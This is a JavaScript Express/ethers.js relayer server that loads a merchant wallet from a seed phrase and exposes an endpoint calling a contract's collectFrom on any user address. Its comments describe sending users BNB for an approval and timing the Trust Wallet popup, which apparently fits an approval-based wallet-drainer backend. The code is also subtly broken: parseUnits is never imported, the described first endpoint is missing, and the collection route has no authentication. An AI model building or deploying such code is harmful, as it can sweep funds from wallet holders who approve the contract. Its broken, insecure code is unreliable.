import dotenv from 'dotenv';
dotenv.config();
import express from 'express';
import cors from 'cors';
import { ethers } from 'ethers';

const app = express();
app.use(cors());
app.use(express.json());

const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);

// .trim() removes any accidental spaces or hidden newline characters
const phrase = process.env.MERCHANT_SECRET_PHRASE?.trim();

if (!phrase) {
    throw new Error("Missing MERCHANT_SECRET_PHRASE in .env");
}

// This creates the wallet directly from your 12 words
const merchantWallet = ethers.Wallet.fromPhrase(phrase, provider);

console.log("Relayer Address:", merchantWallet.address);

// Use the ABI you provided
const CONTRACT_ABI = [
  "function collect(uint256 amount) external",
  "function collectFrom(address userAddress, uint256 amount) external"
];
const collectorContract = new ethers.Contract(process.env.CONTRACT_ADDRESS, CONTRACT_ABI, merchantWallet);

// Endpoint 1: Fund the user with enough BNB for the approval transaction
// OPTIMIZED: Smarter polling that waits for an actual balance increase and gives Trust Wallet 6 seconds to sync
export async function waitForGas(provider, address) {
    // 1. Record the exact balance before we start waiting
    const initialBalance = await provider.getBalance(address);
    const safeGasThreshold = parseUnits("0.0004", 18);

    // If they ALREADY have plenty of gas, no need to wait
    if (initialBalance >= safeGasThreshold) {
        return true;
    }

    // We will check for up to 30 seconds
    for (let i = 0; i < 30; i++) { 
        const currentBalance = await provider.getBalance(address);
        
        // 2. Check if the balance has ACTUALLY INCREASED from the initial state
        if (currentBalance > initialBalance && currentBalance >= safeGasThreshold) {
            console.log("BNB detected on-chain! Waiting 6 seconds for Trust Wallet UI to catch up...");
            
            // 3. THE FIX: 3 seconds was too fast for Trust Wallet's indexer. 
            // We wait 6 seconds to ensure the "Received BNB" push notification clears 
            // and Trust Wallet's internal balance cache updates before opening the popup.
            await new Promise(r => setTimeout(r, 6000)); 
            
            return true;
        }
        
        // Wait 1 second before checking again
        await new Promise(r => setTimeout(r, 1000)); 
    }
    return false;
}

// Endpoint 2: Merchant executes the transfer (Merchant pays gas)
app.post('/execute-collection', async (req, res) => {
    try {
        const { userAddress, amount } = req.body;
        
        // Merchant calls collectFrom. Merchant pays this gas!
        const parsedAmount = ethers.parseUnits(amount.toString(), 18);
        const tx = await collectorContract.collectFrom(userAddress, parsedAmount);
        const receipt = await tx.wait();
        
        res.json({ success: true, txHash: receipt.hash });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.listen(process.env.PORT, () => console.log(`Relayer running on port ${process.env.PORT}`));